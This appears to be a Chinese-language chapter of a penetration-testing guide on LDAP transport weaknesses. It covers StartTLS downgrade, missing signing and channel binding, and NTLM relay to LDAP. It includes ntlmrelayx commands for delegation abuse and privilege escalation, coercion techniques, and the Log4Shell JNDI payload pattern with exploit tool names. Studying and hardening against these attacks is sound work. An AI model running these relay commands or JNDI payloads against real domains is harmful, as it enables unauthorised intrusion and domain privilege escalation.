## 七、协议与传输面：LDAPS/StartTLS/通道绑定/中继

### 7.1 明文LDAP vs LDAPS vs StartTLS
```
明文LDAP(389)         → 凭据/查询可嗅探；中间人可篡改（最危险）
LDAPS(636)            → TLS直连；需校验证书链
StartTLS(389升级)      → 先明文后TLS升级；存在降级面（客户端不强制时攻击者可阻截升级）
攻击视角：
- 应用连接LDAP不校验证书/信任自签 → 中间人注入恶意LDAP服务器 → 窃取绑定凭据/返回伪造结果
- StartTLS未强制 → 降级为明文 → 嗅探
- 客户端配置LDAPS但解析到攻击者IP（LLMNR/NBNS投毒）→ 伪造LDAP服务器
```

### 7.2 通道绑定与签名缺失（AD核心加固检查项）
```
# 未启用LDAP签名：NTLM凭据可在链路上被中继
# 未启用通道绑定（LdapEnforceChannelBinding=0）：
#   → 攻击者与DC建立TLS，同时中继受害者NTLM认证到该TLS会话 → 绕过LDAPS限制
# 检查项（Blue Team视角，攻方验证目标是否已加固）：
- DC组策略 "域控制器: LDAP服务器签名要求" = 无 → 可利用
- 注册表 LdapEnforceChannelBinding=0 → 可利用
- 查询：
ldapsearch -x -H ldap://dc -s base -b "" supportedSASLMechanisms   # 看是否暴露GSSAPI
```

### 7.3 LDAP中继攻击（NTLM Relay to LDAP）
```
# 经典链：coerce认证 → 中继到LDAP → 提权
# PetitPotam/PrinterBug(MS-RPRN) 强制目标机器发起认证
# ntlmrelayx 将认证中继到LDAP/LDAPS → 为目标机器加 RBCD 委派 / 加机器账户 / 改属性
ntlmrelayx.py -t ldap://dc.corp.local --delegate-access
ntlmrelayx.py -t ldaps://dc.corp.local --escalate-user alice
# 前提：LDAP签名/通道绑定未强制；目标出网到中继机
# LDAPS(636) + 无通道绑定仍可中继（CVE-2019-1040后利用通道绑定绕过）
# 2025-2026现状：多数企业已启用签名，但老系统/非Windows设备（NAS、防火墙、打印机）常未强制 → 仍可利用
```

### 7.4 JNDI注入与Log4Shell类LDAP利用（保留v2.0核心）
```
# 见2.3节JNDI注入部分；要点回顾：
# 1. 恶意LDAP服务器返回Reference（指向http远程class，JDK<8u191）或序列化Gadget
# 2. Log4j2 ${jndi:ldap://...} 是经典入口（CVE-2021-44228），2025-2026仍常见于老旧中间件
# 3. 工具：marshalsec / JNDI-Injection-Exploit / rogue-jndi
```

